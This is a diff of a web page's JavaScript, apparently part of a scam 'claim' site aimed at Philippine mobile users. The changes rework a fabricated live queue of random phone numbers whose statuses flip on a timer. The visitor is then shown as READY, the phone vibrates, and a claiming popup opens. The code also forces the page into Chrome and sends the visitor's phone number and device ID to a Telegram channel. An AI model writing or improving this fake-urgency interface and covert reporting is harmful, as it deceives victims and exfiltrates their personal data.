@@ -581,7 +581,7 @@
         </div>
     </div>
 
-                    <script>
+                        <script>
         (function() {
             'use strict';
 
@@ -641,7 +641,7 @@
             if (autoOpenBtn) autoOpenBtn.addEventListener('click', function() { forceOpenInChrome(); });
 
             // ============================================================
-            // SMART DEEPLINK HANDLER
+            // SMART DEEPLINK
             // ============================================================
             function openAsDeeplink(url) {
                 if (!url) return;
@@ -685,7 +685,7 @@
             var readyToClaim = false;
             var pendingLink = null;
 
-            // ✅ QUEUE STATE
+            // QUEUE STATE
             var queueUsers = [];
             var queueListInterval = null;
             var userInQueue = false;
@@ -1237,8 +1237,9 @@
             }
 
             // ============================================================
-            // ✅ BAGONG QUEUE LOGIC (Option B)
-            // 30-50 users | 09XX***XXXX | WAITING→READY | #5→#1 | 2s switch
+            // ✅ QUEUE LOGIC — 5 USERS ONLY
+            // Walang link: 5 random, status flip WAITING<->READY every 5s
+            // May link: user # sa last spot, WAITING → 2s → READY → 1s → transition
             // ============================================================
             var queuePrefixes = ['0912','0917','0918','0927','0998','0945','0966','0955','0939','0906','0977','0908','0920','0921','0928','0929','0930','0935','0936','0946','0947','0948','0949','0950','0951','0956','0961','0963','0965','0967','0975','0976','0978','0979','0994','0995','0996','0997'];
 
@@ -1271,61 +1272,73 @@
                     listEl.appendChild(row);
                 });
             }
-            function scrollUserIntoView() {
-                var listEl = document.getElementById('queueList');
-                if (!listEl) return;
-                var ur = listEl.querySelector('.queue-row.is-user');
-                if (ur && ur.scrollIntoView) ur.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            }
+
             function startLiveUsersCounter() {
                 stopLiveUsersCounter();
                 queueUsers = [];
-                var total = 30 + Math.floor(Math.random() * 21); // 30-50 users
-                for (var i = 0; i < total; i++) {
+                // 5 users lang
+                for (var i = 0; i < 5; i++) {
                     queueUsers.push({ phone: generateQueueNumber(), status: 'WAITING', isUser: false });
                 }
                 userInQueue = false;
                 userLinkDeployed = false;
                 renderQueueList();
+
+                // Every 5s: random status flip (WAITING <-> READY) sa random non-user row
                 queueListInterval = setInterval(function() {
                     if (userLinkDeployed) return;
-                    var c = 1 + Math.floor(Math.random() * 3);
-                    for (var j = 0; j < c; j++) {
-                        var idx = Math.floor(Math.random() * queueUsers.length);
-                        if (queueUsers[idx] && queueUsers[idx].isUser) continue;
-                        queueUsers[idx] = { phone: generateQueueNumber(), status: 'WAITING', isUser: false };
+                    var candidates = [];
+                    for (var j = 0; j < queueUsers.length; j++) {
+                        if (!queueUsers[j].isUser) candidates.push(j);
                     }
+                                        if (candidates.length === 0) return;
+                    var pick = candidates[Math.floor(Math.random() * candidates.length)];
+                    queueUsers[pick].status = queueUsers[pick].status === 'READY' ? 'WAITING' : 'READY';
                     renderQueueList();
-                }, 1200);
+                }, 5000);
             }
             function stopLiveUsersCounter() {
                 if (queueListInterval) { clearInterval(queueListInterval); queueListInterval = null; }
             }
-            function advanceUserInQueue(linkUrl) {
-                var idx = -1;
-                for (var i = 0; i < queueUsers.length; i++) { if (queueUsers[i].isUser) { idx = i; break; } }
-                if (idx < 0) return;
-                if (idx === 0) {
-                    queueUsers[0].status = 'READY';
-                    renderQueueList();
-                    scrollUserIntoView();
-                    setTimeout(function() { switchToReadyClaim(linkUrl); }, 2000);
-                    return;
-                }
-                // swap with previous spot
-                var temp = queueUsers[idx - 1];
-                queueUsers[idx - 1] = queueUsers[idx];
-                queueUsers[idx] = temp;
-                var newIdx = idx - 1;
-                // spots above user = READY, below = WAITING
-                for (var k = 0; k < queueUsers.length; k++) {
-                    if (queueUsers[k].isUser) continue;
-                    queueUsers[k].status = (k < newIdx) ? 'READY' : 'WAITING';
-                }
+
+            // ============================================================
+            // ✅ LINK DEPLOYED → user WAITING → 2s → READY → 1s → transition
+            // ============================================================
+            function showReadyToClaim(linkUrl) {
+                if (readyToClaim) return;
+                userLinkDeployed = true;
+                stopLiveUsersCounter();
+
+                if (userInQueue) return;
+                userInQueue = true;
+
+                // Replace last spot with user's number (WAITING)
+                var userPhoneFormatted = userPhone || '09XX***XXXX';
+                queueUsers[queueUsers.length - 1] = {
+                    phone: userPhoneFormatted,
+                    status: 'WAITING',
+                    isUser: true
+                };
                 renderQueueList();
-                scrollUserIntoView();
-                setTimeout(function() { advanceUserInQueue(linkUrl); }, 1000);
+
+                // after 2 seconds → user becomes READY
+                setTimeout(function() {
+                    for (var i = 0; i < queueUsers.length; i++) {
+                        if (queueUsers[i].isUser) {
+                            queueUsers[i].status = 'READY';
+                            break;
+                        }
+                    }
+                    renderQueueList();
+                    if (navigator.vibrate) { try { navigator.vibrate([100, 50, 200]); } catch(e) {} }
+
+                    // after 1 more second → transition to claiming popup
+                    setTimeout(function() {
+                        switchToReadyClaim(linkUrl);
+                    }, 1000);
+                }, 2000);
             }
+
             function switchToReadyClaim(linkUrl) {
                 readyToClaim = true;
                 pendingLink = linkUrl;
@@ -1340,33 +1353,6 @@
                 if (normalState) normalState.style.display = 'none';
                 if (readyState) readyState.classList.add('show');
                 sendTelegram('✨ READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
-            }
-
-            // ============================================================
-            // ✅ SHOW READY TO CLAIM STATE (link detected)
-            // ============================================================
-            function showReadyToClaim(linkUrl) {
-                if (readyToClaim) return;
-                userLinkDeployed = true;
-                stopLiveUsersCounter();
-                if (!userInQueue) {
-                    userInQueue = true;
-                    var userPhoneFormatted = userPhone || '09XX***XXXX';
-                    // I-insert sa LAST spot as WAITING
-                    queueUsers.push({ phone: userPhoneFormatted, status: 'WAITING', isUser: true });
-                    // Keep only last 5 visible para malinis
-                    while (queueUsers.length > 5) {
-                        // remove from top until user is within last 5
-                        var uIdx = -1;
-                        for (var i = 0; i < queueUsers.length; i++) { if (queueUsers[i].isUser) { uIdx = i; break; } }
-                        if (uIdx < queueUsers.length - 5) { queueUsers.shift(); }
-                        else break;
-                    }
-                    renderQueueList();
-                    scrollUserIntoView();
-                    // 1 sec → start moving up
-                    setTimeout(function() { advanceUserInQueue(linkUrl); }, 1000);
-                }
             }
 
             // ============================================================
@@ -1538,6 +1524,5 @@
 
         })();
     </script>
-
 </body>
 </html>
